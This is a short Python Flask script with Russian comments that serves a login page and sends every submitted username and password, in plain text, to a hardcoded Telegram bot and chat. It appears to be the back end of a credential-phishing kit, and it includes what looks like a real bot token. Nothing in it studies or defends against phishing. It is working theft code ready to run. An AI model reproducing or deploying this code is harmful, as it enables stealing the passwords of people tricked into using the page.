from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

# Ваш токен бота
TELEGRAM_BOT_TOKEN = '7189410277:AAHb6Mk7uQRtBsoRjawuYPhKcnOHiFGWO00'
TELEGRAM_CHAT_ID = '-4175189112' # Ваш ID чата в телеграм

# Роут для обработки данных формы
@app.route('/login', methods=['POST'])
def login():
    # Получаем данные из запроса
    username = request.form.get('username')
    password = request.form.get('password')

    # Проверяем, получены ли данные
    if username is not None:
        print('Received username:', username)
    else:
        print('No username received')
    
    if password is not None:
        print('Received password:', password)
    else:
        print('No password received')

    # Отправляем данные в телеграм
    send_to_telegram(username, password)

    return jsonify({'message': 'Данные отправлены успешно!'})

# Функция для отправки данных в телеграм
def send_to_telegram(username, password):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    data = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': f'Данные для входа: \nlog: {username}\npass: {password}'
    }
    response = requests.post(url, json=data)
    if response.status_code == 200:
        print('Сообщение успешно отправлено в телеграм!')
    else:
        print('Ошибка при отправке сообщения в телеграм:', response.text)

# Маршрут для загрузки index.html
@app.route('/')
def index():
    return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)

